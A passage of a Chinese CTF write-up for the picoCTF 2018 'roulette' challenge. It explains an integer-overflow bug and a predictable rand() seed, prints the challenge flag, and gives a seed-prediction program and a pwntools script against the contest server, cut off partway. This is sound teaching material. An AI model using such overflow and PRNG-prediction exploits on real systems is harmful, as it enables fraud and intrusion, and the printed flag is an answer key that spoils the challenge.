</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>spin_roulette</span>(spin);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (spin <span style=color:#f92672>==</span> choice) {
</span></span><span style=display:flex><span>    cash <span style=color:#f92672>+=</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>*</span>bet;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(win_msgs[<span style=color:#a6e22e>rand</span>()<span style=color:#f92672>%</span>NUM_WIN_MSGS]);
</span></span><span style=display:flex><span>    wins <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(lose_msgs1[<span style=color:#a6e22e>rand</span>()<span style=color:#f92672>%</span>NUM_LOSE_MSGS]);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(lose_msgs2[<span style=color:#a6e22e>rand</span>()<span style=color:#f92672>%</span>NUM_LOSE_MSGS]);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>//获得一笔随机数额的小于5000的初始资金；下注直到cash大于ONE_BILLION(1000000000)且wins大等于HOTSTREAK(3)小于MAX_WINS(16)获得flag。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[]) {
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stdout, NULL, _IONBF, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  cash <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_rand</span>();
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Welcome to ONLINE ROULETTE!&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Here, have $%ld to start on the house! You&#39;ll lose it all anyways &gt;:)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, cash);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> bet;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> choice;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>(cash <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>      bet <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_bet</span>();
</span></span><span style=display:flex><span>      cash <span style=color:#f92672>-=</span> bet;
</span></span><span style=display:flex><span>      choice <span style=color:#f92672>=</span> <span style=color:#a6e22e>get_choice</span>();
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>      
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>play_roulette</span>(choice, bet);
</span></span><span style=display:flex><span>      
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (wins <span style=color:#f92672>&gt;=</span> MAX_WINS) {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Wow you won %lu times? Looks like its time for you cash you out.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, wins);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Congrats you made $%lu. See you next time!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, cash);
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>exit</span>(<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span>(cash <span style=color:#f92672>&gt;</span> ONE_BILLION) {
</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;*** Current Balance: $%lu ***</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, cash);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (wins <span style=color:#f92672>&gt;=</span> HOTSTREAK) {
</span></span><span style=display:flex><span>	  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Wow, I can&#39;t believe you did it.. You deserve this flag!&#34;</span>);
</span></span><span style=display:flex><span>	  <span style=color:#a6e22e>print_flag</span>();
</span></span><span style=display:flex><span>	  <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>	  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Wait a second... You&#39;re not even on a hotstreak! Get out of here cheater!&#34;</span>);
</span></span><span style=display:flex><span>	  <span style=color:#a6e22e>exit</span>(<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Haha, lost all the money I gave you already? See ya later!&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>提示说有两个bug。</p><p>其一出现在第27行，get_Long()函数的<code>uint64_t l = 0;</code> 。函数声明的返回值为<code>long</code> 型，实际返回值为<code>uint64_t</code> 型，前者有符号最大值为<code>LONG_MAX:2^31-1</code> ，后者无符号最大值为<code>ULONG_MAX:2^64-1</code> ，存在向上溢出为负数的风险。</p><p>真正使上溢成为可能的是32-35行 <code>if(l >= LONG_MAX){l = LONG_MAX; break;}</code> ，这个判断希望控制返回值不超过<code>long</code> 型数据的最大值，但应该写在while循环结束的地方而不是开始的地方，否则只能控制数据进入循环时符合条件，而离开时就不知道了，十倍以内都是可能的，而这足以溢出了。</p><p>到此为止，我们可以控制cash为任意值了，只要输入bet为 <code>当前cash+2^32-目标cash</code> ，在大概率(35/36)输的情况下，我们就能让cash变为想要的值。</p><p>要拿到flag还要求赢至少三次，那问题不大，下小注总会有赢的时候。按概率来算，总是对固定choice下注，可以期望在100次左右赢三次。但题目做了控制，太频繁交互会被禁止连接。于是看看其他的方法。</p><p>如果要改变wins，只能使choice与166行的 <code>long spin = (rand() % ROULETTE_SIZE)+1;</code> 相等，那么会发现这个随机数序列是在第52行播种的，种子就是我们的初始资金，是已知的。于是就可以知道每一次的spin了。EXP搬运自 <a href=https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md>https://github.com/sefi-roee/CTFs-Writeups/blob/master/picoCTF-2018/General/18-roulette-350/solution.md</a> ，偷个懒就不写了。</p><p><code>picoCTF{1_h0p3_y0u_f0uNd_b0tH_bUg5_e9328e04}</code></p><p><img loading=lazy src=6708e5edbe613b2ff.png alt></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#get_rand_seq.c
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdint.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;time.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;limits.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[]) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> seed <span style=color:#f92672>=</span> <span style=color:#a6e22e>atoi</span>(argv[<span style=color:#ae81ff>1</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>srand</span>(seed);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>100</span>; <span style=color:#f92672>++</span>i)
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%d,&#34;</span>, <span style=color:#a6e22e>rand</span>());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-52>52</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> subprocess
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;2018shell1.picoctf.com&#39;</span>, <span style=color:#ae81ff>21444</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sleep(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>lines <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;&gt; &#39;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>join(lines)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>balance <span style=color:#f92672>=</span> int(lines[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>split()[<span style=color:#ae81ff>2</span>][<span style=color:#ae81ff>1</span>:])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;Start balance: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(balance))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;Predicting random values&#34;</span>)
</span></span><span style=display:flex><span>values <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>check_output([<span style=color:#e6db74>&#34;./get_rand_seq&#34;</span>, str(balance)])
</span></span><span style=display:flex><span>values <span style=color:#f92672>=</span> values<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;,&#39;</span>)
</span></span><span style=display:flex><span>values <span style=color:#f92672>=</span> [int(v, <span style=color:#ae81ff>10</span>) <span style=color:#66d9ef>for</span> v <span style=color:#f92672>in</span> values[:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ROULETTE_SIZE <span style=color:#f92672>=</span> <span style=color:#ae81ff>36</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>   spin <span style=color:#f92672>=</span> (values[i] <span style=color:#f92672>%</span> ROULETTE_SIZE) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>   i <span style=color:#f92672>+=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;Putting </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>$ on </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(balance, spin))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(balance))
</span></span><span style=display:flex><span>   r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(spin))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   balance <span style=color:#f92672>*=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   print r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;&gt; &#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   print r<span style=color:#f92672>.</span>recv()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>spin <span style=color:#f92672>=</span> (values[i] <span style=color:#f92672>%</span> ROULETTE_SIZE) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
